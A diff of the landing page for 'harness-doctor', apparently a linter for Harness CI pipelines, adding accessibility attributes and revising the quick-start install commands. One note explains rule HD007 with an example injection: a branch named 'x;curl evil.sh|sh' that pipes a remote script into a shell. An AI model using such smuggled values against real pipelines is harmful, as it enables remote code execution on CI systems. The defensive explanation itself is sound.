@@ -47,7 +47,7 @@ nav .links a:hover{color:var(--fg)}
 .btn:active{transform:none}
 .skip{position:absolute;left:8px;top:-60px;z-index:9;background:var(--panel);color:var(--fg);padding:8px 14px;border-radius:8px;border:1px solid var(--line)}
 .skip:focus{top:8px}
-.btn:focus-visible,textarea:focus-visible,button:focus-visible,a:focus-visible{outline:2px solid #10b981;outline-offset:2px}
+.tw:focus-visible,pre:focus-visible,.btn:focus-visible,textarea:focus-visible,button:focus-visible,a:focus-visible{outline:2px solid #10b981;outline-offset:2px}
 .hero{padding:72px 0 40px;text-align:center}
 h1{font-size:clamp(34px,6vw,58px);line-height:1.08;margin:0 0 18px;letter-spacing:-.02em}
 h1 em{font-style:normal;color:var(--brand)}
@@ -184,29 +184,30 @@ footer .wrap{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
   <h2>What it checks</h2>
   <p class="sub">The list comes from the linter itself, so it matches the code. Without JavaScript, see the <a href="https://github.com/gerardrecinto/harness-doctor#readme">README</a>.</p>
   <p class="pw">Each row is one mistake the tool looks for, and why it is risky.</p>
-  <div class="tw"><table><thead><tr><th>Rule</th><th>Severity</th><th>File</th><th>Check</th><th>Why it matters</th></tr></thead><tbody id="rules-body"><tr><td colspan="5">Loading...</td></tr></tbody></table></div>
+  <div class="tw" tabindex="0" role="region" aria-label="Pipeline rules"><table><thead><tr><th>Rule</th><th>Severity</th><th>File</th><th>Check</th><th>Why it matters</th></tr></thead><tbody id="rules-body"><tr><td colspan="5">Loading...</td></tr></tbody></table></div>
   <p class="note">HD007 is easy to miss: Harness pastes <code>&lt;+codebase.branch&gt;</code> into the script before the shell reads it, so a branch named <code>x;curl evil.sh|sh</code> runs as code.</p>
 </div></section>
 
 <section id="install" class="install"><div class="wrap">
   <h2>Quick start</h2>
-  <p class="sub">Needs Python 3.10 or newer. This installs the current <code>main</code> branch.</p>
+  <p class="sub">Needs Git and Python 3.10 or newer as <code>python3</code>, in a macOS or Linux shell. This installs the current <code>main</code> branch.</p>
   <div class="cols2">
     <div>
       <div class="qs"><button class="copy" type="button" hidden>Copy</button>
-<pre><code>python -m venv .venv &amp;&amp; . .venv/bin/activate
-pip install "harness-doctor[schema] @ git+https://github.com/gerardrecinto/harness-doctor"
-harness-doctor check .harness .github/workflows</code></pre></div>
+<pre tabindex="0"><code>git clone https://github.com/gerardrecinto/harness-doctor &amp;&amp; cd harness-doctor
+python3 -m venv .venv &amp;&amp; . .venv/bin/activate
+pip install .
+harness-doctor check examples/bad/deploy.yaml</code></pre></div>
       <div class="qs"><button class="copy" type="button" hidden>Copy</button>
-<pre><code>harness-doctor check .harness --fail-on warning
-harness-doctor check .harness --format sarif
+<pre tabindex="0"><code>harness-doctor check .harness --fail-on warning
+harness-doctor check .harness --format sarif &gt; findings.sarif
 harness-doctor explain HD007</code></pre></div>
-      <p class="pw">The last two commands save a report file that GitHub can read (SARIF) and explain one rule.</p>
+      <p class="pw">The sample exits 1 because it contains errors. Run <code>harness-doctor check examples/good</code> for a clean result. To check your own repo, run <code>check</code> on its pipeline folder. The SARIF command saves a report file that GitHub can read; <code>explain</code> describes one rule.</p>
       <p class="note">Exit code 0 means clean, 1 means findings, 2 means bad input such as a missing folder.</p>
     </div>
     <div>
       <div class="qs"><button class="copy" type="button" hidden>Copy</button>
-<pre><code>- uses: actions/checkout@v7
+<pre tabindex="0"><code>- uses: actions/checkout@v7
 - uses: gerardrecinto/harness-doctor@v0.1.1
   with:
     path: .harness
